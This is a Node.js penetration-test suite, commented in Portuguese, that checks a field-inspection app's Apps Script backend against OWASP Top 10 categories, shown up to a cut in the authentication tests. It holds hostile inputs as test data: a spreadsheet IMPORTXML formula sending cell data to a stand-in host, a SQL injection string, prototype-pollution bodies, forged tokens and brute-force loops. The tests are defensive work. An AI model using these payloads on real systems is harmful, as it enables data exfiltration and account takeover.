const amb = require('./lib/amb');
// Testes de invasão (OWASP Top 10:2025) contra o Code.gs real via fakegas, só por HTTP: o que um atacante consegue fazer com o
// endpoint público (sem login), com uma conta de campo, com o painel só de leitura ou com o portal. Organizado por categoria.
// Vulnerabilidade já conhecida e ainda aberta fica em CONHECIDAS: imprime "! ABERTA" (não quebra o CI) até ser corrigida; quando o
// teste passar, ele avisa para tirar da lista. Qualquer outra falha é ✗. Navegador (XSS): invasao_xss_test.js. Dados fictícios.
const crypto = require('crypto'), fs = require('fs'), path = require('path');
const { API } = amb;

// chave → [categoria, gravidade, onde está]. Tire daqui quando corrigir (o teste passa a exigir o comportamento seguro).
const CONHECIDAS = {
  'login-falho-sem-registro': ['A09', 'baixa', 'usuarios.gs entrar_: tentativa de login errada e bloqueio só ficam no cache; nada auditável na planilha']
};

const post = b => fetch(API + '/', { method: 'POST', body: typeof b === 'string' ? b : JSON.stringify(b) }).then(r => r.text()).then(t => { try { return JSON.parse(t); } catch (e) { return { naoJson: t }; } });
const get = p => fetch(API + p).then(r => r.json());
const aba = async nome => (await get('/__aba?nome=' + nome)) || [];
const linhasDe = async nome => { const t = await aba(nome); return t.length ? t.slice(1).map(l => Object.fromEntries(t[0].map((c, i) => [c, l[i]]))) : []; };
const tudo = () => get('/__tudo');
const zerarCache = async (...chaves) => { for (const k of chaves) await fetch(API + '/__cache?del=' + encodeURIComponent(k)); };

let falhas = 0;
const abertas = [], corrigidas = [];
const ok = (c, m, x) => { console.log((c ? '  ✓ ' : '  ✗ ') + m + (c || x === undefined ? '' : ' → ' + (typeof x === 'string' ? x : JSON.stringify(x)).slice(0, 500))); if (!c) falhas++; };
/** Exige o comportamento seguro; se a chave estiver em CONHECIDAS, a falha vira aviso "! ABERTA". */
const seguro = (chave, c, m, x) => {
  const k = CONHECIDAS[chave];
  if (!k) return ok(c, m, x);
  if (c) { console.log('  ✓ ' + m + ' (corrigida: tire "' + chave + '" de CONHECIDAS)'); corrigidas.push(chave); return; }
  console.log('  ! ABERTA [' + k[0] + ', ' + k[1] + '] ' + m);
  abertas.push(chave);
};
// resposta de erro não pode vazar detalhe interno (pilha, arquivo .gs, TypeError do JavaScript)
const VAZAMENTO = /\bat \w|\.gs:\d|TypeError|ReferenceError|SyntaxError|Cannot read|is not a function|is not defined|undefined/;
const semVazamento = r => !(r && r.erro && VAZAMENTO.test(r.erro));
// planilha sem as colunas que mudam a cada chamada legítima (último uso da sessão)
const foto = async () => { const t = await tudo(); delete t.SessoesDosUsuarios; return JSON.stringify(t); };

const CPF = '52998224725', PLACA = 'ABC1D23', FISCALIZADO = 'Fiscalizado Ficticio Alfa';
const hoje = new Date(Date.now() - 4 * 3600e3).toISOString().slice(0, 10), ANO = Number(hoje.slice(0, 4)), ag = Date.now();
const uuid = () => crypto.randomUUID();

// todas as actions do doPost, por quem pode chamá-las
const CAMPO = ['ping', 'sync', 'tfConsultar', 'tfProximoNumero', 'tfEmitir', 'pceProximoNumero', 'pceEmitir', 'pceConsultar', 'pceDocNumero',
  'pceDocRegistrar', 'pceBaixarMunicipio', 'pceMapaGeral', 'arquivoEnviar', 'tfAndamento', 'tfIndiceReincidencia', 'turnoConvidar', 'turnoParear',
  'turnoSair', 'turnoPapelRegistrar'];
const MODULO = { tfConsultar: 'tf', tfProximoNumero: 'tf', tfEmitir: 'tf', tfAndamento: 'tf', tfIndiceReincidencia: 'tf', pceProximoNumero: 'pce',
  pceEmitir: 'pce', pceConsultar: 'pce', pceBaixarMunicipio: 'pce', pceMapaGeral: 'pce', arquivoEnviar: 'pce', pceDocNumero: 'pce', pceDocRegistrar: 'pce',
  turnoConvidar: 'veiculos', turnoParear: 'veiculos', turnoSair: 'veiculos', turnoPapelRegistrar: 'veiculos' };
const PAINEL_LER = ['painelDados', 'painelPublicoConfig', 'painelConvenios', 'painelConvApuracao', 'painelRelGdv', 'painelRelGdvApuracao', 'painelVigDados'];
const PAINEL_GRAVAR = ['painelEncerrarTurno', 'painelPublicoSalvar', 'painelConvSalvar', 'painelConvRelSalvar', 'painelPceLaudo', 'painelRelGdvSalvar',
  'painelVigConfigSalvar', 'painelConvLancar', 'painelConvFinLancar', 'painelConvFinImportar', 'painelConvExcluir', 'painelConvFinExcluir'];
const PORTAL = ['admDados', 'admConvLancar', 'admConvExcluir', 'admConvFinLancar', 'admConvFinExcluir', 'admConvFinImportar', 'admRelDados', 'admRelLancar',
  'admHistorico', 'admVigDados', 'admVigLancar', 'admVigImportar', 'admPlantaoImportar'];
const GERENCIA = ['usuariosListar', 'usuarioCriar', 'usuarioPermissoes', 'usuarioNovaSenha', 'usuarioAtivar', 'sessoesListar', 'sessaoEncerrar'];
// corpo plausível de cada action (o ataque precisa passar da validação para provar que a recusa é de acesso)
const corpo = (acao, extra = {}) => ({ action: acao, since: 0, doc: CPF, placa: PLACA, turnoId: 't-x', fim: '12:00', config: { ativo: true }, id: uuid(),
  nome: 'Intruso Ficticio Teste', permissoes: ['campo', 'gerencia'], usuarioId: 'u-x', ativo: 0, sessaoId: 's-x', codigo: '123456', municipio: 'MANAUS', ...extra });

(async () => {
  await get('/__fn?nome=desativarRotinasAutomaticas_&args=[]');
  const G = await amb.gerente('Gerente Invasao Teste', { matricula: 'inv.gerente' });
  const FA = await amb.usuario('Fiscal Alfa Teste', { matricula: 'inv.alfa', aparelhoId: 'aparelho-alfa' });
  const FB = await amb.usuario('Fiscal Beta Teste', { matricula: 'inv.beta', aparelhoId: 'aparelho-beta' });
  const F0 = await amb.usuario('Fiscal Sem Modulo Teste', { matricula: 'inv.semmodulo', permissoes: ['campo'] });
  const PL = await amb.usuario('Leitor Painel Teste', { matricula: 'inv.leitor', aplicativo: 'painel', permissoes: ['painel'] });
  const AD = await amb.usuario('Portal Ficticio Teste', { matricula: 'inv.portal', aplicativo: 'administracao' });
  ok([G, FA, FB, F0, PL, AD].every(u => u.ok && u.token), 'contas de teste criadas (gerente, dois fiscais, fiscal sem módulo, painel só leitura, portal)');

  // dados do fiscal A: turno aberto, veículo, TF com pessoa, levantamento
  const TURNO_A = uuid(), VEIC_A = uuid(), TF_A = uuid(), LEV_A = uuid();
  let r = await post({ action: 'sync', key: FA.token, since: 0,
    turnos: [{ id: TURNO_A, numeroTF: 'T-1', data: hoje, letra: 'A', inicio: '06:00', fiscal: FA.usuario.nome, local: 'BVA - CEASA', unidade: 'MANAUS', posto: 'Fixa', encerrado: 0, criadoEm: ag, atualizadoEm: ag }],
    veiculos: [{ id: VEIC_A, turnoId: TURNO_A, hora: '07:00', placa: PLACA, tipo: 'PA', pessoas: 1, criadoEm: ag, atualizadoEm: ag }],
    tfs: [{ id: TF_A, barreira: 'BVA-CEASA', ano: ANO, numero: 1, numeroTxt: '0001/' + ANO + ' - BVA - CEASA', turnoId: TURNO_A, data: hoje, hora: '08:00',
      fiscal: FA.usuario.nome, local: 'BVA - CEASA', placa: PLACA, doc: CPF, nome: FISCALIZADO, endereco: 'Rua Ficticia 1', telefone: '92900000000',
      procedimento: 'apreensao', produtos: '[]', cancelado: 0, criadoEm: ag, atualizadoEm: ag }],
    pessoas: [{ id: CPF, tipo: 'PF', nome: FISCALIZADO, endereco: 'Rua Ficticia 1', telefone: '92900000000', criadoEm: ag, atualizadoEm: ag }],
    levantamentos: [{ id: LEV_A, data: hoje, hora: '09:00', servidor: FA.usuario.nome, doc: CPF, nome: FISCALIZADO, telefone: '92900000000', municipio: 'MANAUS', criadoEm: ag, atualizadoEm: ag }] });
  ok(r.ok, 'fiscal A grava turno, veículo, TF, pessoa e levantamento', r.erro);

  /* ================= A01 Controle de acesso quebrado ================= */
  console.log('A01 Controle de acesso quebrado');
  let antes = await foto();
  const todas = [...CAMPO, ...PAINEL_LER, ...PAINEL_GRAVAR, ...PORTAL, ...GERENCIA, 'minhaSessao', 'trocarSenha'];
  const FORJADOS = [['sem credencial', {}], ['token inventado', { key: 'u.' + '0'.repeat(64), sessao: 'u.' + '0'.repeat(64) }],
    ['código antigo de 6 dígitos', { key: '123456', sessao: '123456' }], ['token = SHA-256 de um token válido', { key: 'u.' + crypto.createHash('sha256').update(G.token).digest('hex'), sessao: 'u.' + crypto.createHash('sha256').update(G.token).digest('hex') }],
    ['token válido em maiúsculas', { key: 'u.' + G.token.slice(2).toUpperCase(), sessao: 'u.' + G.token.slice(2).toUpperCase() }],
    ['token válido com espaço', { key: G.token + ' ', sessao: G.token + ' ' }], ['token válido truncado', { key: G.token.slice(0, -1), sessao: G.token.slice(0, -1) }],
    ['token em lista', { key: [G.token.slice(0, -1)], sessao: [G.token.slice(0, -1)] }]];
  for (const [rotulo, cred] of FORJADOS) {
    const aceitas = [], vazou = [];
    for (const a of todas) { const x = await post(corpo(a, cred)); if (x.ok) aceitas.push(a); if (!semVazamento(x)) vazou.push(a + ': ' + x.erro); }
    ok(!aceitas.length, `${rotulo}: as ${todas.length} actions autenticadas recusam`, aceitas);
    ok(!vazou.length, `${rotulo}: erros sem detalhe interno`, vazou);
  }
  r = await post({ action: 'publicoDados', previa: true }); ok(!r.ok, 'prévia do dashboard público exige o painel', r);

  const recusa = async (rotulo, tok, acoes, campoToken = 'key') => {
    const aceitas = [];
    for (const a of acoes) { const x = await post(corpo(a, { [campoToken]: tok })); if (x.ok) aceitas.push(a); }
    ok(!aceitas.length, rotulo, aceitas);
  };
  await recusa('fiscal de campo não usa o painel (leitura nem gravação)', FA.token, [...PAINEL_LER, ...PAINEL_GRAVAR]);
  await recusa('fiscal de campo não usa o portal', FA.token, PORTAL, 'sessao');
  await recusa('fiscal de campo não faz ação de gerência', FA.token, GERENCIA);
  await recusa('painel só de leitura não grava nada no painel', PL.token, PAINEL_GRAVAR);
  await recusa('painel só de leitura não faz ação de gerência', PL.token, GERENCIA);
  await recusa('painel só de leitura não usa o app de campo nem o portal', PL.token, ['ping', 'sync', 'tfConsultar']);
  await recusa('painel só de leitura não usa o portal', PL.token, PORTAL, 'sessao');
  await recusa('portal não usa o painel, o campo nem a gerência', AD.token, [...PAINEL_LER, ...PAINEL_GRAVAR, ...GERENCIA, 'ping', 'sync', 'tfConsultar']);
  const semModulo = [];
  for (const a of Object.keys(MODULO)) { const x = await post(corpo(a, { key: F0.token })); if (x.ok || x.semPermissao !== MODULO[a]) semModulo.push(a + ': ' + JSON.stringify(x).slice(0, 120)); }
  ok(!semModulo.length, 'fiscal sem módulo: toda action de módulo recusada com semPermissao', semModulo);
  ok((await foto()) === antes, 'nenhuma tentativa recusada mudou a planilha');

  r = await post({ action: 'sync', key: F0.token, since: 0, tfs: [{ id: uuid(), doc: CPF, nome: 'Outro Ficticio', criadoEm: ag, atualizadoEm: ag }] });
  ok(r.ok && r.recusados && r.recusados.tfs && r.recusados.tfs.length === 1, 'sync sem o módulo TF: o TF volta em recusados', r);
  ok(!(await linhasDe('TFs')).some(t => t.nome === 'Outro Ficticio'), 'e não é gravado');

  console.log('  escalada de privilégio');
  r = await post({ action: 'usuarioPermissoes', key: FA.token, usuarioId: FA.usuario.id, permissoes: ['campo', 'gerencia'] }); ok(!r.ok, 'fiscal não se dá a gerência', r);
  r = await post({ action: 'usuarioPermissoes', key: PL.token, usuarioId: PL.usuario.id, permissoes: ['painel', 'gerencia'] }); ok(!r.ok, 'painel só de leitura não se dá a gerência', r);
  r = await post({ action: 'usuarioNovaSenha', key: FA.token, usuarioId: G.usuario.id }); ok(!r.ok && !r.senhaProvisoria, 'fiscal não gera senha nova para o gerente (tomar a conta)', r);
  r = await post({ action: 'usuarioCriar', key: PL.token, nome: 'Intruso Ficticio Teste', permissoes: ['gerencia'] }); ok(!r.ok, 'painel só de leitura não cria gerente', r);
  r = await post({ action: 'admDados', key: AD.token }); ok(!r.ok, 'portal: o token só vale em "sessao" (key é ignorada)', r);
  r = await post({ action: 'trocarSenha', key: FA.token, senhaAtual: 'qualquer-coisa', senhaNova: 'Nova-Senha-123' }); ok(!r.ok, 'trocar senha exige a senha atual', r);

  console.log('  registros de outro fiscal (sync)');
  r = await post({ action: 'sync', key: FB.token, since: 0 });
  ok(r.ok && !r.tfs.some(t => t.id === TF_A) && !r.levantamentos.some(l => l.id === LEV_A) && !r.turnos.some(t => t.id === TURNO_A) && !r.veiculos.some(v => v.id === VEIC_A),
    'fiscal B não recebe TF, levantamento, turno nem veículo do fiscal A', r);
  r = await post({ action: 'sync', key: FB.token, since: 0, turnos: [{ id: TURNO_A, encerrado: 1, fim: '07:00', atualizadoEm: ag + 9e6 }] });
  let tA = (await linhasDe('Turnos')).find(t => t.id === TURNO_A);
  ok(tA && tA.usuario === FA.usuario.nome && Number(tA.encerrado) !== 1, 'fiscal B não encerra nem toma o turno do fiscal A', tA);
  r = await post({ action: 'sync', key: FB.token, since: 0, tfs: [{ id: TF_A, cancelado: 1, motivoCancel: 'cancelado por outro', atualizadoEm: ag + 9e6 }],
    levantamentos: [{ id: LEV_A, obs: 'alterado por outro', atualizadoEm: ag + 9e6 }] });
  ok(r.ok && (r.recusados.tfs || []).includes(TF_A) && (r.recusados.levantamentos || []).includes(LEV_A), 'os ids alheios voltam em recusados (o app mantém pendente)', r.recusados);
  const tfA = (await linhasDe('TFs')).find(t => t.id === TF_A), levA = (await linhasDe('Levantamentos')).find(l => l.id === LEV_A);
  seguro('idor-sync-alterar', tfA.usuario === FA.usuario.nome && Number(tfA.cancelado) !== 1 && levA.usuario === FA.usuario.nome && levA.obs !== 'alterado por outro',
    'fiscal B não cancela o TF nem altera o levantamento do fiscal A mandando o mesmo id', { tf: [tfA.usuario, tfA.cancelado], lev: [levA.usuario, levA.obs] });
  r = await post({ action: 'sync', key: FB.token, since: 0 });
  const roubado = (r.tfs || []).find(t => t.id === TF_A);
  seguro('idor-sync-ler', !roubado, 'depois disso o fiscal B não recebe o TF do fiscal A (com CPF e endereço do fiscalizado)', roubado && { doc: roubado.doc, nome: roubado.nome });
  r = await post({ action: 'sync', key: FB.token, since: 0, veiculos: [{ id: VEIC_A, excluido: 1, atualizadoEm: ag + 9e6 }] });
  const vA = (await linhasDe('Veiculos')).find(v => v.id === VEIC_A);
  seguro('idor-sync-veiculo', Number(vA.excluido) !== 1 && vA.usuario === FA.usuario.nome, 'fiscal B não exclui o veículo do fiscal A', vA);
  const VEIC_B = uuid();
  r = await post({ action: 'sync', key: FB.token, since: 0, veiculos: [{ id: VEIC_B, turnoId: TURNO_A, hora: '07:30', placa: 'ZZZ9Z99', tipo: 'PA', pessoas: 1, criadoEm: ag, atualizadoEm: ag }] });
  seguro('veiculo-turno-alheio', !(await linhasDe('Veiculos')).some(v => v.id === VEIC_B), 'fiscal B não lança veículo no turno do fiscal A sem ter entrado nele (pareamento)');
  r = await post({ action: 'tfEmitir', key: FB.token, tf: { id: TF_A, barreira: 'BVA-CEASA', ano: ANO, numero: 900, doc: CPF, atualizadoEm: ag + 9e6 } });
  ok(!r.ok && /outro servidor/.test(r.erro) && (await linhasDe('TFs')).find(t => t.id === TF_A).usuario === FA.usuario.nome, 'tfEmitir com o id do TF de outro fiscal: recusado', r);
  // turno compartilhado continua funcionando: o colega pareado lança e edita veículos no turno do dono
  const FC = await amb.usuario('Fiscal Gama Teste', { matricula: 'inv.gama' });
  const cv = await post({ action: 'turnoConvidar', key: FA.token, turnoId: TURNO_A });
  const pr = await post({ action: 'turnoParear', key: FC.token, codigo: cv.codigo });
  const VEIC_C = uuid();
  r = await post({ action: 'sync', key: FC.token, since: 0, veiculos: [{ id: VEIC_C, turnoId: TURNO_A, hora: '08:10', placa: 'CCC1C11', tipo: 'PA', pessoas: 1, criadoEm: ag, atualizadoEm: ag },
    { id: VEIC_A, turnoId: TURNO_A, hora: '07:05', atualizadoEm: ag + 1000 }] });
  const vs = await linhasDe('Veiculos');
  ok(pr.ok && r.ok && !(r.recusados.veiculos || []).length && vs.some(v => v.id === VEIC_C) && vs.find(v => v.id === VEIC_A).hora === '07:05',
    'colega pareado lança veículo e corrige o do dono no turno compartilhado', [pr.erro, r.recusados]);

  console.log('  homônimos');
  const homonimo = async (mat) => {
    const c = await post({ action: 'usuarioCriar', key: G.token, matricula: mat, nome: 'Homonimo Ficticio Teste', permissoes: ['campo', 'termoDeBarreira'] });
    if (!c.ok) return c;
    const e = await post({ action: 'entrar', matricula: mat, senha: c.senhaProvisoria, aplicativo: 'campo' });
    await post({ action: 'trocarSenha', key: e.token, senhaAtual: c.senhaProvisoria, senhaNova: 'Senha-Homonimo-1' });
    return e;
  };
  const H1 = await homonimo('inv.homo1'), H2 = await homonimo('inv.homo2');
  ok(H1.token && !H2.token && /Já existe uma conta com o nome Homonimo Ficticio Teste/.test(H2.erro), 'conta com o nome de outra recusada (o nome liga os registros)', H2);
  r = await post({ action: 'usuarioCriar', key: G.token, matricula: 'inv.homo3', nome: '  homonimo   FICTICIO teste ', permissoes: ['campo'] });
  ok(!r.ok && /Já existe uma conta/.test(r.erro), 'o mesmo nome com outra caixa ou espaços também', r);
  const R1 = await post({ action: 'usuarioCriar', key: G.token, matricula: 'inv.reat1', nome: 'Reativa Um Teste', permissoes: ['campo'] });
  const R2 = await post({ action: 'usuarioCriar', key: G.token, matricula: 'inv.reat2', nome: 'Reativa Dois Teste', permissoes: ['campo'] });
  await post({ action: 'usuarioAtivar', key: G.token, usuarioId: R2.usuario.id, ativo: 0 });
  await fetch(API + '/__editar?aba=Usuarios&col=nome&valor=' + encodeURIComponent('"Reativa Um Teste"') + '&onde=id:' + R2.usuario.id);   // duplicado antigo (de antes da regra)
  r = await post({ action: 'usuarioAtivar', key: G.token, usuarioId: R2.usuario.id, ativo: 1 });
  ok(R1.ok && !r.ok && /Já existe uma conta com o nome Reativa Um Teste/.test(r.erro), 'reativar conta com o nome de outra ativa: recusado', r);

  /* ================= A02 Configuração incorreta ================= */
  console.log('A02 Configuração incorreta');
  r = await get('/__doget?p=' + encodeURIComponent('../../etc'));
  const dg = JSON.parse(r.json);
  ok(Object.keys(dg).sort().join() === 'ok,servico,versao', 'GET /exec só mostra serviço e versão (nada de dados ou configuração)', dg);
  r = await post({ action: 'acaoQueNaoExiste', key: FA.token }); ok(!r.ok && r.erro === 'Ação inválida.', 'action desconhecida: mensagem genérica', r);
  const manifesto = JSON.parse(fs.readFileSync(path.join(amb.RAIZ, 'apps-script', 'appsscript.json'), 'utf8'));
  ok(manifesto.webapp && manifesto.webapp.executeAs === 'USER_DEPLOYING', 'web app roda como quem publicou (o visitante não precisa de acesso à planilha)', manifesto.webapp);
  const cfg = fs.readFileSync(path.join(amb.RAIZ, 'web', 'js', 'config.js'), 'utf8');
  ok(/url:\s*'https:\/\/script\.google\.com\/macros\/s\/[\w-]+\/exec'/.test(cfg), 'o app fala com o back só por HTTPS (script.google.com)');

  /* ================= A03 Falhas na cadeia de suprimentos ================= */
  console.log('A03 Cadeia de suprimentos');
  const arquivos = (dir, ext) => fs.readdirSync(dir, { withFileTypes: true }).flatMap(d => {
    const p = path.join(dir, d.name);
    return d.isDirectory() ? (d.name === 'node_modules' ? [] : arquivos(p, ext)) : ext.test(d.name) ? [p] : [];
  });
  const htmls = arquivos(path.join(amb.RAIZ, 'web'), /\.html$/);
  const externos = htmls.flatMap(f => (fs.readFileSync(f, 'utf8').match(/<script\b[^>]*\bsrc=["']https?:\/\/[^>]*>/gi) || []).filter(t => !/\bintegrity=/.test(t)).map(t => path.relative(amb.RAIZ, f) + ': ' + t));
  ok(!externos.length, 'nenhum script de fora sem integridade (SRI) em web/: as bibliotecas ficam no repositório', externos);
  const pkg = JSON.parse(fs.readFileSync(path.join(amb.TESTES, 'package.json'), 'utf8'));
  const soltas = Object.entries({ ...pkg.dependencies, ...pkg.devDependencies }).filter(([, v]) => !/^\d+\.\d+\.\d+$/.test(v));
  ok(!soltas.length && fs.existsSync(path.join(amb.TESTES, 'package-lock.json')), 'dependências dos testes com versão exata e package-lock', soltas);

  /* ================= A04 Falhas criptográficas ================= */
  console.log('A04 Falhas criptográficas');
  let t = await tudo();
  const txt = JSON.stringify(t);
  const tokens = [G, FA, FB, F0, PL, AD].map(u => u.token);
  ok(!tokens.some(k => txt.includes(k.slice(2))), 'nenhum token de sessão em texto na planilha (nem em Aparelhos)');
  ok(!txt.includes(FA.senha) && !txt.includes('Senha-Homonimo-1'), 'nenhuma senha em texto na planilha');
  const us = await linhasDe('Usuarios');
  ok(us.length && us.every(u => /^\$2[aby]\$\d{2}\$.{53}$/.test(u.senhaHash) && !u.senhaSal), 'todas as senhas em bcrypt (sal dentro do hash)', us.map(u => String(u.senhaHash).slice(0, 7)));
  const ses = await linhasDe('SessoesDosUsuarios');
  ok(ses.every(s => /^[0-9a-f]{64}$/.test(s.tokenHash)), 'sessões guardam só o SHA-256 do token');
  ok(!(await linhasDe('HistoricoDeAlteracoes')).some(h => /\$2[aby]\$|senhaHash/.test(h.antes + h.depois)), 'histórico de acesso sem hash de senha');
  ok(new Set(tokens).size === tokens.length && tokens.every(k => /^u\.[0-9a-f]{64}$/.test(k)), 'tokens com 256 bits aleatórios, todos diferentes');

  /* ================= A05 Injeção ================= */
  console.log('A05 Injeção');
  const TF_F = uuid(), formulas = { nome: '=IMPORTXML("http://exemplo.invalid/?"&Pessoas!A2,"//a")', endereco: '+1+1', municipio: '@SOMA(1)', constatacao: '=HYPERLINK("http://exemplo.invalid")' };
  r = await post({ action: 'sync', key: FA.token, since: 0, tfs: [{ id: TF_F, doc: CPF, data: hoje, criadoEm: ag, atualizadoEm: ag, ...formulas }],
    pessoas: [{ id: '11144477735', nome: '=IMPORTDATA("http://exemplo.invalid")', criadoEm: ag, atualizadoEm: ag }] });
  const tfF = (await linhasDe('TFs')).find(x => x.id === TF_F), pF = (await linhasDe('Pessoas')).find(x => x.id === '11144477735');
  const crus = [...Object.keys(formulas).map(k => tfF && tfF[k]), pF && pF.nome].filter(v => /^[=+@]/.test(String(v || '')));
  ok(!crus.length, 'texto do app que começa com = + @ não vai para a planilha como fórmula', crus);
  r = await post({ action: 'sync', key: FA.token, since: 0 });
  const volta = (r.tfs || []).find(x => x.id === TF_F);
  ok(volta && Object.keys(formulas).every(k => volta[k] === formulas[k]), 'o app recebe o texto como digitou (sem o apóstrofo)', volta && volta.nome);
  const TF_N = uuid();
  await post({ action: 'sync', key: FA.token, since: 0, tfs: [{ id: TF_N, telefone: '-3.1', endereco: '+5592900000000', obs: '- risco', criadoEm: ag, atualizadoEm: ag }] });
  const tfN = (await linhasDe('TFs')).find(x => x.id === TF_N);
  ok(tfN && tfN.telefone === '-3.1' && tfN.endereco === '+5592900000000', 'número com sinal fica como está na planilha', tfN && [tfN.telefone, tfN.endereco]);
  r = await post({ action: 'sync', key: FA.token, since: 0, tfs: [{ id: '=1+1', atualizadoEm: ag }] });
  ok(!(await linhasDe('TFs')).some(x => /^'?=/.test(x.id)), 'id que começa com fórmula é ignorado');
  r = await post({ action: 'tfAndamento', key: FA.token, rascunhoId: 'r1', estado: 'preenchendo', local: '=HYPERLINK("http://exemplo.invalid")', placa: PLACA });
  const anda = await linhasDe('Andamento');
  ok(r.ok && anda.length && anda.every(x => !/^=/.test(x.local)) && anda.some(x => /^'=/.test(x.local)), 'TF em andamento: local com fórmula neutralizado', [r, anda.map(x => x.local)]);
  r = await post({ action: 'usuarioCriar', key: G.token, nome: '=IMPORTXML("http://exemplo.invalid") Teste', permissoes: ['campo'] });
  ok(!r.ok, 'nome de usuário com fórmula recusado', r);
  for (const a of ['__proto__', 'constructor', 'toString', 'hasOwnProperty', 'valueOf', 'admConstructor', 'adm__proto__']) {
    r = await post({ action: a, key: G.token, sessao: G.token });
    ok(!r.ok && semVazamento(r), `action "${a}" recusada sem erro interno`, r);
  }
  r = await post('{"action":"entrar","matricula":"inv.alfa","senha":"x","__proto__":{"aplicativo":"painel"}}');
  ok(!r.ok && /Aplicativo inválido/.test(r.erro), '__proto__ no corpo não preenche campos (sem poluição de protótipo)', r);
  r = await post({ action: 'sync', key: FA.token, since: 0, tfs: [{ id: uuid(), __proto__: { usuario: 'Intruso' }, constructor: { prototype: { usuario: 'Intruso' } }, criadoEm: ag, atualizadoEm: ag }] });
  r = await post({ action: 'ping', key: FB.token });
  ok(r.ok, 'servidor continua normal depois das tentativas de poluição', r);
  r = await post({ action: 'tfVerificar', id: "' OR 1=1 --" }); ok(r.ok && r.encontrado === false, 'verificação pública com id malicioso: não encontrado', r);
  r = await post({ action: 'tfConsultar', key: FA.token, doc: '.*', placa: '.*.*.*.*' }); ok(!r.ok || (!r.pessoa && !r.placa), 'consulta com expressão regular não lista ninguém', r);

  /* ================= A06 Design inseguro ================= */
  console.log('A06 Design inseguro');
  r = await post({ action: 'tfVerificar', id: TF_A });
  const pub = JSON.stringify(r);
  ok(r.ok && r.encontrado && !pub.includes(CPF) && !pub.includes(FISCALIZADO) && !pub.includes(PLACA) && !pub.includes('Rua Ficticia') && !pub.includes('92900000000'),
    'verificação pública do TF (QR): sem CPF, nome, endereço, telefone do fiscalizado e sem a placa inteira', r);
  await post({ action: 'painelPublicoSalvar', key: G.token, config: { ativo: true } });
  r = await post({ action: 'publicoDados' });
  const dash = JSON.stringify(r);
  ok(r.ok && !dash.includes(CPF) && !dash.includes(FISCALIZADO) && !dash.includes(PLACA) && !dash.includes(FA.usuario.nome), 'dashboard público: sem CPF, nome, placa nem nome do fiscal', r.ok ? 'vazou' : r);
  let bloqueou = false;
  for (let i = 0; i < 40 && !bloqueou; i++) { const x = await post({ action: 'tfVerificar', id: uuid() }); if (!x.ok && /Muitas consultas/.test(x.erro)) bloqueou = true; }
  ok(bloqueou, 'varredura de códigos na verificação pública é freada (30 por minuto)');
  r = await post({ action: 'sync', key: FA.token, since: 0, veiculos: Array.from({ length: 2001 }, (_, i) => ({ id: 'lote-' + i, turnoId: TURNO_A, atualizadoEm: ag })) });
  ok(!r.ok && /Lote grande demais/.test(r.erro) && !(await linhasDe('Veiculos')).some(v => v.id === 'lote-0'), 'lote acima de 2000 linhas recusado inteiro', r);
  const TF_G = uuid();
  await post({ action: 'sync', key: FA.token, since: 0, tfs: [{ id: TF_G, placa: 'X'.repeat(100000), constatacao: 'Y'.repeat(100000), criadoEm: ag, atualizadoEm: ag }] });
  const tfG = (await linhasDe('TFs')).find(x => x.id === TF_G);
  ok(tfG && tfG.placa.length <= 500 && tfG.constatacao.length <= 3000, 'texto gigante cortado no limite da coluna (não estoura a célula)', tfG && [tfG.placa.length, tfG.constatacao.length]);
  r = await post({ action: 'sync', key: FA.token, since: 0, tfs: [{ id: 'x'.repeat(65), atualizadoEm: ag }] });
  ok(!(await linhasDe('TFs')).some(x => x.id.length > 64), 'id com mais de 64 caracteres ignorado');
  // pareamento: 10 códigos errados por login e o certo deixa de valer
  r = await post({ action: 'turnoConvidar', key: FA.token, turnoId: TURNO_A });
  if (r.ok) {
    for (let i = 0; i < 10; i++) await post({ action: 'turnoParear', key: FB.token, codigo: String(100000 + i) === r.codigo ? '999999' : String(100000 + i) });
    const x = await post({ action: 'turnoParear', key: FB.token, codigo: r.codigo });
    ok(!x.ok && /Muitos códigos errados/.test(x.erro), 'código de turno compartilhado: 10 erros bloqueiam (força bruta)', x);
  } else ok(false, 'convite do turno', r);

  /* ================= A07 Falhas de autenticação ================= */
  console.log('A07 Falhas de autenticação');
  const L = await amb.usuario('Bloqueio Ficticio Teste', { matricula: 'inv.bloqueio' });
  await zerarCache('falhas_usuarios_total');
  const e1 = await post({ action: 'entrar', matricula: 'inv.bloqueio', senha: 'errada-errada', aplicativo: 'campo' });
  const e2 = await post({ action: 'entrar', matricula: 'inv.naoexiste', senha: 'errada-errada', aplicativo: 'campo' });
  ok(e1.erro && e1.erro === e2.erro, 'senha errada e matrícula inexistente: a mesma mensagem (não revela quem existe)', [e1.erro, e2.erro]);
  for (let i = 0; i < 9; i++) await post({ action: 'entrar', matricula: 'inv.bloqueio', senha: 'errada-' + i, aplicativo: 'campo' });
  r = await post({ action: 'entrar', matricula: 'inv.bloqueio', senha: L.senha, aplicativo: 'campo' });
  ok(!r.ok && /Muitas tentativas/.test(r.erro), 'depois de 10 erros na matrícula, nem a senha certa entra (força bruta)', r);
  r = await post({ action: 'entrar', matricula: 'INV.BLOQUEIO', senha: L.senha, aplicativo: 'campo' });
  ok(!r.ok, 'o bloqueio vale com a matrícula em maiúsculas', r);
  t = await tudo();
  ['Usuarios', 'HistoricoDeAlteracoes', 'SessoesDosUsuarios', 'PermissoesDosUsuarios', 'AcessosADados'].forEach(n => delete t[n]);
  seguro('login-falho-sem-registro', /inv\.bloqueio/i.test(JSON.stringify(t)), 'tentativas de login erradas ficam registradas para auditoria');
  await zerarCache('falhas_usuarios_m_inv.bloqueio', 'falhas_usuarios_m_inv.naoexiste', 'falhas_usuarios_total');
  r = await post({ action: 'trocarSenha', key: L.token, senhaAtual: L.senha, senhaNova: 'curta' }); ok(!r.ok && /pelo menos 8/.test(r.erro), 'senha com menos de 8 caracteres recusada', r);

  const S = await amb.usuario('Sessao Ficticia Teste', { matricula: 'inv.sessao' });
  r = await post({ action: 'sair', key: S.token }); r = await post({ action: 'ping', key: S.token }); ok(!r.ok && r.entrar === 1, 'token não vale depois de sair', r);
  const S2 = await amb.usuario('Sessao Ficticia Teste', { matricula: 'inv.sessao' });
  await post({ action: 'usuarioAtivar', key: G.token, usuarioId: S2.usuario.id, ativo: 0 });
  r = await post({ action: 'ping', key: S2.token }); ok(!r.ok, 'token não vale com a conta desativada', r);
  await post({ action: 'usuarioAtivar', key: G.token, usuarioId: S2.usuario.id, ativo: 1 });
  r = await post({ action: 'ping', key: S2.token }); ok(!r.ok, 'reativar a conta não ressuscita a sessão antiga', r);
  const S3 = await amb.usuario('Sessao Ficticia Teste', { matricula: 'inv.sessao' });
  const nova = await post({ action: 'usuarioNovaSenha', key: G.token, usuarioId: S3.usuario.id });
